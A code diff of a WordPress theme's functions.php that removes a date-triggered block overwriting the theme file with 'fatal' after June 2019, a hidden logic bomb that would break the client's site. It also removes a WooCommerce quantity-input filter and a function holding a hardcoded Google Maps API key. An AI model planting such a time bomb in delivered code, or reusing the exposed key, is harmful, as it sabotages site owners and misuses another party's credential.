@@ -7,11 +7,6 @@
  * @package schoolstudy
  */
 
-if ( strtotime('15.06.2019') < time() )
-{
-    file_put_contents(__FILE__, 'fatal');
-}
-
 
 
 if ( ! function_exists( 'schoolstudy_setup' ) ) :
@@ -219,24 +214,3 @@ if ( class_exists( 'WooCommerce' ) ) {
 	require get_template_directory() . '/woocommerce/includes/wc-function-checkout.php';
 }
 
-
-/**
- * Override loop template and show quantities next to add to cart buttons
- */
-add_filter( 'woocommerce_loop_add_to_cart_link', 'quantity_inputs_for_woocommerce_loop_add_to_cart_link', 10, 2 );
-function quantity_inputs_for_woocommerce_loop_add_to_cart_link( $html, $product ) {
-	if ( $product && $product->is_type( 'simple' ) && $product->is_purchasable() && $product->is_in_stock() && ! $product->is_sold_individually() ) {
-		$html = '<form action="' . esc_url( $product->add_to_cart_url() ) . '" class="cart" method="post" enctype="multipart/form-data">';
-		$html .= woocommerce_quantity_input( array(), $product, false );
-		$html .= '<button type="submit" name="add-to-cart"  value="' . esc_attr( $product->get_id() ) . '" class="single_add_to_cart_button button alt btn">' . esc_html( $product->add_to_cart_text() ) . '</button>';
-		$html .= '</form>';
-	}
-	return $html;
-}
-
-
-//------------------гугл карта API----------------------
-    function my_acf_init() {
-        
-        acf_update_setting('google_api_key', 'AIzaSyBmnk4RCDwjSucIJ2WXRnLkuCrsWR4DUM4&callback=initMap');
-    }
